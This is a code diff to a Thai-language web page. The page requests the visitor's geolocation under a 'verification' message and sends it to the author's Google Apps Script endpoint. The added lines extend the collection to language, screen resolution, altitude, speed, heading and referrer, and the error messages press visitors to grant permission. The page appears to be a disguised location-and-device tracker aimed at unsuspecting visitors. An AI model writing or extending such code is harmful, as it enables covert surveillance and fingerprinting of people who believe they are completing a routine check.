@@ -209,7 +209,7 @@
             loader.style.display = 'block';
 
             if (!navigator.geolocation) {
-                displayError("บราวเซอร์ของคุณไม่รองรับการระบุตำแหน่ง");
+                displayError("บราวเซอร์ของคุณไม่รองรับ");
                 return;
             }
 
@@ -225,17 +225,24 @@
             const lat = position.coords.latitude;
             const lon = position.coords.longitude;
             
-            statusMessage.innerText = "ยืนยันสำเร็จ!";
+            statusMessage.innerText = "ยืนยันตำแหน่งสำเร็จ!";
             statusMessage.className = 'message-success';
             loader.style.display = 'block';
 
+            // --- รวบรวมข้อมูลเพิ่มเติมทั้งหมด ---
             const dataToSend = {
                 latitude: lat,
                 longitude: lon,
                 accuracy: position.coords.accuracy,
-                timestamp: new Date().toISOString(),
+                timestamp: new Date().toISOString(), // เวลามาตรฐานสากล (UTC)
                 googleMapsLink: `https://www.google.com/maps?q=${lat},${lon}`,
-                userAgent: navigator.userAgent
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                altitude: position.coords.altitude, // อาจเป็น null
+                speed: position.coords.speed,       // อาจเป็น null
+                heading: position.coords.heading,   // อาจเป็น null
+                referrer: document.referrer       // แหล่งที่มา
             };
             
             // ส่งข้อมูลไปยัง Google Apps Script API ของเรา
@@ -259,10 +266,10 @@
             let errorMessage = "";
             switch(error.code) {
                 case error.PERMISSION_DENIED:
-                    errorMessage = "โปรดอนุญาตเพื่อดำเนินการต่อ";
+                    errorMessage = "คุณปฏิเสธ โปรดอนุญาตเพื่อดำเนินการต่อ";
                     break;
                 case error.POSITION_UNAVAILABLE:
-                    errorMessage = "ไม่สามารถดำเนินการได้ในขณะนี้";
+                    errorMessage = "ไม่สามารถเข้าถึงได้ในขณะนี้";
                     break;
                 case error.TIMEOUT:
                     errorMessage = "หมดเวลาในการร้องขอ กรุณาลองใหม่อีกครั้ง";
